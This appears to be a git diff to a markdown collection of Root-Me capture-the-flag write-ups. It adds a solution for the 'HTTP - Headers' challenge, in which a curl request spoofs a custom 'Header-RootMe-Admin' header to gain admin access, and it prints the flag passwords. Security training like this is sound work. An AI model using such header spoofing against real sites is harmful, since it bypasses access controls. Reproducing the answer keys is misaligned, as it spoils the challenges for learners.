@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [8/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [9/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -14,7 +14,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 6. [PHP - Command injection](#php-command-injection) 🗸
 7. [Backup file](#backup-file) 🗸
 8. [HTTP - Directory indexing](#http-directory-indexing) 🗸
-9. [HTTP - Headers](#http-headers)
+9. [HTTP - Headers](#http-headers) 🗸
 10. [HTTP - POST](#http-post)
 11. [HTTP - Improper redirect](#http-improper-redirect)
 12. [HTTP - Verb tampering](#http-verb-tampering)
@@ -818,7 +818,7 @@ OCCY9AcNm1tj
 ## Directory Indexing
 
 - Author: g0uZ
-- Date: 27 Feruary 2011
+- Date: 27 February 2011
 - Points: 15
 - Level: 2
 
@@ -907,6 +907,102 @@ Password / Mot de passe : LINUX
 
 ~~~
 LINUX
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## HTTP Headers
+
+- Author: Arod
+- Date: 11 January 2015
+- Points: 15
+- Level: 2
+
+### Statement
+
+Get an administrator access to the webpage.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch5/).
+
+### Resources
+
+1. [RFC 2616](https://repository.root-me.org/RFC/EN%20-%20rfc2616.txt).
+2. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website, we find a html page:
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <p>Content is not the only part of an HTTP response!
+    </p>
+  </body>
+</html>
+~~~
+
+Using CURL, we can view the response header from the site:
+
+~~~shell
+$ curl --head http://challenge01.root-me.org/web-serveur/ch5/
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 09 Jan 2022 14:43:40 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Vary: Accept-Encoding
+Header-RootMe-Admin: none
+~~~
+
+We can change the "Header-RootMe-Admin" header using CURL:
+
+~~~shell
+$ curl --header "Header-RootMe-Admin: True" http://challenge01.root-me.org/web-serveur/ch5/
+~~~
+
+We get a different html response which includes the challenge solution:
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <p>Content is not the only part of an HTTP response!
+    </p>
+    <p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful
+    </p>
+  </body>
+</html>
+
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+HeadersMayBeUseful
 ~~~
 
 </details>
